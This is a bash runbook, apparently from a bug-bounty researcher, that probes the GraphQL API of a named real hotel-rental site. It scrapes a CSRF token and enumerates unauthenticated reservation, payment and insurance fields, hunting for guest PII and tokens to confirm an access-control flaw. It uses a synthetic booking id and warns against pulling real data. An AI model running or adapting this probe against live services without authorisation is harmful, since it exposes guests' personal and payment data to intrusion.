#!/usr/bin/env bash
# =============================================================================
# Marriott — HnV reservationDetails field map (snake_case) — session43
# Portable: Linux / Pi / Termux.
#
# s42 PROVED: reservationDetails(confirmation_id: ID!) runs UNAUTHENTICATED
# (CSRF only) and returns a non-null object for any id. But field enum used
# camelCase; the API is snake_case (confirmation_id/listing_id/start_date), so
# only total/currency matched. This run re-enumerates in snake_case + explores
# nested object types to determine WHAT a confirmation_id exposes unauth:
#   - scalar PII (guest_email, guest_name, phone...) -> Critical BOLA
#   - nested objects (guest{}, property{}, payment{}) -> recurse one level
#   - if only price -> low severity, report accordingly
# Also fully maps freedomPayDetails + travelInsuranceDetails (data unauth in s41).
#
# SAFETY: SYNTHETIC confirmation id only (matches nothing -> fields resolve null).
# We map the SCHEMA, not real data. Read-only, no mutations, stop-on-real-PII.
#
# Run (Termux): OUTDIR=$HOME/s43 bash runbooks/PI-RUNBOOK-session43-hnv-resv-fields.sh \
#                 2>&1 | tee $HOME/s43/s43.log
# =============================================================================
set -o pipefail
if [ -z "${OUTDIR:-}" ]; then
  if [ -d /tmp ] && [ -w /tmp ]; then OUTDIR=/tmp/s43
  elif [ -n "${TMPDIR:-}" ] && [ -w "${TMPDIR}" ]; then OUTDIR="$TMPDIR/s43"
  else OUTDIR="$HOME/s43"; fi
fi
export OUTDIR; mkdir -p "$OUTDIR"
UA='Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'
IDH='X-Bug-Bounty: hackerone-researcher'
T="homes-and-villas.marriott.com"; B="https://$T"; JAR="$OUTDIR/jar.txt"
SYN="ZZTEST-0000-0000-NOTREAL"

echo "============================================================"
echo "HNV reservationDetails FIELD MAP  $(date -u '+%Y-%m-%dT%H:%M:%SZ')   IP: $(curl -s ifconfig.me)"
echo "Work: $OUTDIR"; echo "============================================================"; echo ""

curl -s -o "$OUTDIR/home.html" -c "$JAR" -H "User-Agent: $UA" -H "$IDH" --max-time 25 "$B/" >/dev/null || true
TOK=$(grep -oE 'id="sourceid"[^>]*data-source="[^"]+"' "$OUTDIR/home.html" | head -1 | sed -E 's/.*data-source="([^"]+)".*/\1/')
[ -z "$TOK" ] && TOK=$(grep -oE '"csrfToken":"[^"]+"' "$OUTDIR/home.html" | head -1 | sed -E 's/.*:"([^"]+)"/\1/')
echo "csrf token: ${TOK:0:30}..."; echo ""

gq() { curl -s -o "$OUTDIR/$2.json" -b "$JAR" -H "User-Agent: $UA" -H "$IDH" \
  -H 'Content-Type: application/json' -H 'Accept: application/json' \
  -H "Origin: $B" -H "Referer: $B/" -H "x-hvmi-csrf-token: $TOK" \
  --max-time 20 --data "$1" -w '%{http_code}|%{size_download}' "$B/gateway/graphql" 2>/dev/null || echo "000|0"; }

# classify a field probe on reservationDetails -> ABSENT / SCALAR / OBJECT
probe_field() { # field tag
  local F="$1" tag="$2"
  gq "{\"query\":\"query R(\$c:ID!){reservationDetails(confirmation_id:\$c){$F}}\",\"variables\":{\"c\":\"$SYN\"}}" "$tag" >/dev/null
  local b; b=$(cat "$OUTDIR/$tag.json")
  if echo "$b" | grep -q "Cannot query field"; then echo "ABSENT"
  elif echo "$b" | grep -qi "must have a selection of subfields"; then echo "OBJECT"
  elif echo "$b" | grep -qi "must not have a selection"; then echo "SCALAR"
  elif echo "$b" | grep -q '"data"'; then echo "SCALAR"
  else echo "OTHER"; fi
}

echo "═══ PHASE A: reservationDetails FIELDS (snake_case + camel) ═══"
FIELDS="confirmation_id reservation_id id status state guest guest_id guest_name \
guest_first_name guest_last_name guest_email guest_phone first_name last_name \
full_name name email email_address phone phone_number mobile contact contact_info \
check_in check_out check_in_date check_out_date arrival_date departure_date \
start_date end_date nights number_of_guests num_guests guests adults children \
total total_price sub_total subtotal amount amount_paid balance currency taxes fees \
property property_id property_name listing listing_id listing_name host host_id \
host_name host_email address street city state country postal_code zip location \
payment payment_method payment_details card card_last4 last_four billing \
created_at booking_date updated_at special_requests notes loyalty_number \
member_id marsha_code source confirmation_number booking_id itinerary cancellation"
OBJ=""
for F in $FIELDS; do
  R=$(probe_field "$F" "a-$F")
  case "$R" in
    SCALAR) printf '  SCALAR  %s\n' "$F";;
    OBJECT) printf '  OBJECT  %s   <- recurse\n' "$F"; OBJ="$OBJ $F";;
  esac
  sleep 0.25
done
echo "  object fields to expand:$OBJ"
echo ""

echo "═══ PHASE B: EXPAND OBJECT FIELDS (one level) ═══"
SUB="id name first_name last_name full_name email email_address phone phone_number \
address street city state country postal_code zip status amount total currency \
date check_in check_out start_date end_date last4 card_last4 method type token \
property_name listing_name host_name number count"
for O in $OBJ; do
  echo "  -- reservationDetails.$O { } --"
  for S in $SUB; do
    gq "{\"query\":\"query R(\$c:ID!){reservationDetails(confirmation_id:\$c){$O{$S}}}\",\"variables\":{\"c\":\"$SYN\"}}" "b-$O-$S" >/dev/null
    b=$(cat "$OUTDIR/b-$O-$S.json")
    echo "$b" | grep -q "Cannot query field" || { echo "$b" | grep -qi "must have a selection" && echo "    OBJECT  $O.$S" || echo "    FIELD   $O.$S"; }
    sleep 0.2
  done
done
echo ""

echo "═══ PHASE C: freedomPayDetails + travelInsuranceDetails (full map) ═══"
for OP in freedomPayDetails travelInsuranceDetails; do
  echo "  -- $OP --"
  for F in $FIELDS token payment_token client_token merchant_id api_key public_key \
           session_id session_key url endpoint config provider account_id; do
    gq "{\"query\":\"query{${OP}{$F}}\"}" "c-$OP-$F" >/dev/null
    b=$(cat "$OUTDIR/c-$OP-$F.json")
    echo "$b" | grep -q "Cannot query field" || echo "    PRESENT $OP.$F"
    sleep 0.18
  done
done
echo ""

echo "════════════════════════════════════════════"
echo "SEVERITY READ"
echo "════════════════════════════════════════════"
python3 - << 'PYEOF'
import os,glob
O=os.environ["OUTDIR"]
# collect present reservation fields (scalar+object) from phase A files that werent ABSENT
pii_keywords=("email","phone","name","guest","address","card","payment","last4","loyalty","member","contact","mobile","postal","zip")
present=[]
for f in glob.glob(os.path.join(O,"a-*.json")):
    name=os.path.basename(f)[2:-5]
    b=open(f,encoding="utf-8",errors="replace").read()
    if "Cannot query field" not in b:
        present.append(name)
pii=[p for p in present if any(k in p for k in pii_keywords)]
print("  reservationDetails fields present:", sorted(present))
print("  PII-ish among them:", sorted(pii))
print()
if pii:
    print("  >>> CRITICAL CANDIDATE: reservationDetails exposes guest PII fields")
    print("  >>> with NO auth (confirmation_id is the only gate) = unauth BOLA.")
    print("  >>> Next: a clean PoC. Ideally one OWN HnV reservation's confirmation_id")
    print("  >>> queried while logged out -> returns your PII -> undeniable. Do NOT")
    print("  >>> pull strangers' data; synthetic id + schema proof is the safe baseline.")
else:
    print("  >>> reservationDetails appears limited (price/currency only). Lower")
    print("  >>> severity. Re-check object expansions (Phase B) for nested PII before")
    print("  >>> concluding; if truly price-only, document as minor and move on.")
PYEOF
echo ""
echo "Evidence: $OUTDIR"
echo "Run complete: $(date -u '+%Y-%m-%dT%H:%M:%SZ')"
